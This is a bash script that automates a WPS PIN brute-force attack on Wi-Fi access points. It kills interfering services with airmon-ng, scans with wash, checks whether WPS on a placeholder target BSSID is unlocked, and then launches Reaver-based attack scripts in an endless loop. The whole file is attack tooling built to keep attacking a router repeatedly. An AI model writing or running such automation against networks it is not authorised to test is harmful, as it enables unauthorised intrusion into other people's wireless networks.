#!/bin/bash

chmod +x *.sh

while true

do

./mon-servstop-ext.sh

airmon-ng check kill
echo "network scan begining..."
echo " "
timeout 60s wash -i <iface> | tee /root/wash-log.txt
echo " "
echo "open main reaver process..."
echo " "

RESP="$(grep '<BSSID>' /root/wash-log.txt | awk '{print $5}')"
if [ "$RESP" = "No" ]; then

xterm -geometry "65x25+0+0" -e "./channel-set-A1.sh && ./auto-assoc-simple-A1-ext.sh" | xterm -geometry "85x25+403+0" -e "sleep 2 && ./auto-reaver-simple-A1-ext.sh"

else

echo "network attack..."
echo " "
# attack or attack-limited ------------
./"attack-$(awk '{print $1}' *-AP.txt | sed 's/://g').sh"
# ./"attack-limited-$(awk '{print $1}' *-AP.txt | sed 's/://g').sh"

echo "START ALL OVER AGAIN !-!-!-!-!-!-!-!-!-!-! :-)"
fi

done
